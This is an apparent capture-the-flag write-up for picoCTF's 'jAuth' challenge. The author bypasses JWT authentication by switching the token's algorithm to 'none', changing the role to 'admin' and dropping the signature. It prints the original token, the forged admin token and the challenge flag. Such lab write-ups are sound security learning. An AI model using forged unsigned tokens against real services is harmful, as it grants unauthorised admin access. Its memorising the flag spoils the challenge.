# CTF based on JWT auth bypass

## 1. picoCTF: jAuth

The challenge first hints for using insecure software components. I searched for vulnrability in jAuth ended up not getting anything. At the end, I solved it as follows.
caught the jwt i got from the test account. 

JWT was taken to https://token.dev and the algorithm type was changed to none and the role was changed to admin in the payload part. This way the verifier end will not check against any algorithm. The signaure part was removed by lefting the end dot(.) intact. 
Made request to /private endpoint with the token=<below_token> and got the flag
```
# jwt given by server
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzIwMzE2MTMzNjczLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjAuMC42MDk5LjcxIFNhZmFyaS81MzcuMzYiLCJyb2xlIjoidXNlciIsImlhdCI6MTcyMDMxNjEzNH0.v6X6u_cx56szaBiqImfy2mBoxoNtjbdzz19wNLbPEcY
# changed jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzIwMzE2MTMzNjczLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjAuMC42MDk5LjcxIFNhZmFyaS81MzcuMzYiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MjAzMTYxMzR9.
```
**Flag:** picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}
